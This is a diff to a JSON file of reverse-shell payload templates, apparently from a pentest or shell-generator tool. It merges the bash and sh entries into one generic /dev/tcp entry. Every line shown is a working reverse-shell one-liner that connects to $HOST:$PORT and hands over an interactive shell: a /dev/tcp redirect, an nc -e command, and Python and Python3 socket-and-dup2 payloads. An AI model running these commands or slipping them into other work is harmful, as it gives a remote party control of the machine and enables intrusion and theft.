@@ -1,6 +1,5 @@
 {
-    "bash": "bash -i >& /dev/tcp/$HOST/$PORT 0>&1",
-    "sh": "sh -i >& /dev/tcp/$HOST/$PORT 0>&1",
+    "/dev/tcp": "$SHELL -i >& /dev/tcp/$HOST/$PORT 0>&1",
     "nc": "nc -e /bin/$SHELL $HOST $PORT",
     "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/$SHELL\",\"-i\"]);'",
     "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/$SHELL\",\"-i\"]);'",
